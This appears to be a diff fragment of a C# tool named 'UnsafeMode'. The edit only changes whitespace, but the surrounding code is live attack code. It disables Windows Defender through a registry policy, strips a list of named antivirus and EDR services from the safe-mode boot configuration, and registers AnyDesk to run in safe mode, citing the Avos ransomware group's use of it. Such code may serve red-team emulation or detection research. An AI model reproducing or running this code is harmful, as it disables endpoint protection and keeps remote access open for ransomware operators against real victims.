@@ -77,10 +77,10 @@ namespace UnsafeMode
             RegEdit("add", @"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1", 1);
             //trying to disable typical AV/EDR when running in safe mode
             string[] delete = {"SepMasterService", "CbDefense", "CbDefenseWSC", "EPProtectedService", "epredline", "CylanceSvc", "SAVService", "klnagent", "Sophos File Scanner Service", "SntpService", "EPSecurityService", "EPUpdateService", "EPIntegrationService", "TmCCSF", "TmWSCSvc"};
-			foreach(string protection in delete)
-			{
+		    foreach(string protection in delete)
+		    {
 				RegEdit("del", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", protection, "", 0);
-			}
+		    }
             //adding anydesk to run in safemode (Avos abuses anydesk)
             RegEdit("addKey", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", "AnyDeskMSI", "", 0);
             RegEdit("add", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDeskMSI", "", "Service", 0); //writes to the (default) reg value
